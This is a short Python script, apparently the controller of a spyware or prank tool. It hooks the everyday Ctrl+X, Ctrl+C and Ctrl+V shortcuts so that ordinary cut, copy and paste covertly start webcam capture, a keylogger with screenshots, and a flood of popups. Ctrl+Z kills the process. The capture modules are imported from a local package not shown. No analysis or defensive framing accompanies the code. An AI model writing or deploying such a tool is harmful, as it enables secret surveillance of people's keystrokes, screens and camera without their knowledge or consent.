from pynput.keyboard import Listener
import os
import threading
from Classes import popup, logger, Background_Changer as bg, screenshots as ss, fotos as ft
import schedule
import subprocess

import keyboard

def message(text):
    print(text)

def ctrlX(): #acceso a camara
    threading.Thread(target=ft.camera).start()
    # threading.Thread(target=message('x')).start()

def ctrlC(): #mensajes en pantalla
    p = popup.popupGenerator()
    threading.Thread(target=p.start_popups(30)).start()
    # threading.Thread(target=message('c')).start()

def ctrlV(): #keylogger y screenshots
    s = ss.ScreenShots()
    l = logger.KeyLogger()
    threading.Thread(target=l.start).start()
    threading.Thread(target=s.Run).start()
    # threading.Thread(target=message('v')).start()
    
def stop():
    os.kill(os.getpid(), 9)

keyboard.add_hotkey('ctrl+x',ctrlX)
keyboard.add_hotkey('ctrl+c',ctrlC)
keyboard.add_hotkey('ctrl+v',ctrlV)
keyboard.add_hotkey('ctrl+z',stop)

keyboard.wait()
